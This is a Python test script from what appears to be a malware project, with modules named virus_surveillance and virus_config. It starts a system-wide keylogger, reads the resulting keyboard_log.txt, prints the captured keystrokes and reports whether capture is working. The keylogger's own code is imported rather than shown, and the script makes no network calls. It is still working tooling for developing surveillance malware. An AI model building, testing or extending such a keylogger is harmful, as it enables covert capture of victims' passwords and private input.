#!/usr/bin/env python3
"""
Live test of keylogger - actually tries to capture keys
"""
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from virus_surveillance import start_system_keylogger, log_key_press
from virus_config import DATA_DIR
import time

print("=" * 70)
print("LIVE KEYLOGGER TEST")
print("=" * 70)
print("\nStarting keylogger...")
start_system_keylogger()

log_file = os.path.join(DATA_DIR, "keyboard_log.txt") if os.path.exists(DATA_DIR) else "keyboard_log.txt"

print(f"\nKeylogger started. Log file: {log_file}")
print("Type some keys now (letters, numbers, etc.)...")
print("Press Ctrl+C to stop after typing some keys\n")

try:
    for i in range(10):
        time.sleep(1)
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                lines = f.readlines()
                recent = [l for l in lines if 'Key Pressed' in l]
                if recent:
                    print(f"\n✅ Found {len(recent)} key press entries!")
                    print("Recent keys:")
                    for line in recent[-5:]:
                        print(f"  {line.strip()}")
                    break
except KeyboardInterrupt:
    pass

print("\n" + "=" * 70)
print("Checking log file...")
if os.path.exists(log_file):
    with open(log_file, 'r') as f:
        content = f.read()
        key_entries = content.count('Key Pressed')
        print(f"Total key press entries in log: {key_entries}")
        if key_entries > 0:
            print("✅ KEYLOGGER IS WORKING!")
        else:
            print("❌ KEYLOGGER NOT CAPTURING KEYS")
            print("\nLast 10 lines of log:")
            lines = content.split('\n')
            for line in lines[-10:]:
                if line.strip():
                    print(f"  {line}")
else:
    print(f"❌ Log file not found: {log_file}")

print("=" * 70)

